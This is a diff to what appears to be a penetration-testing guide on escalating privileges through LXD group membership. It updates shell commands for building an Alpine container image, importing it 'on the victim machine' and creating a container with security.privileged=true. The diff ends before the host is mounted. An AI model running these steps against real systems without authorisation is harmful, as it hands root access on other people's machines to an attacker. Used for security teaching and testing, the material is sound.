@@ -13,17 +13,18 @@ You can install in your machine this distro builder: [https://github.com/lxc/dis
 sudo apt update
 sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
 #Clone repo
-go get -d -v github.com/lxc/distrobuilder
+sudo go get -d -v github.com/lxc/distrobuilder
 #Make distrobuilder
 cd $HOME/go/src/github.com/lxc/distrobuilder
 make
-cd
 #Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
+
+# If that fails, run it adding -o image.release=3.8 at the end.
 ```
 
 Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
@@ -59,10 +60,15 @@ Build an Alpine image and start it using the flag `security.privileged=true`, fo
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
-./build-alpine -a i686
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
 
 # import the image
-lxc image import ./alpine.tar.gz --alias myimage
+lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+# before running the image, start and configure the lxd storage pool as default 
+lxd init
 
 # run the image
 lxc init myimage mycontainer -c security.privileged=true
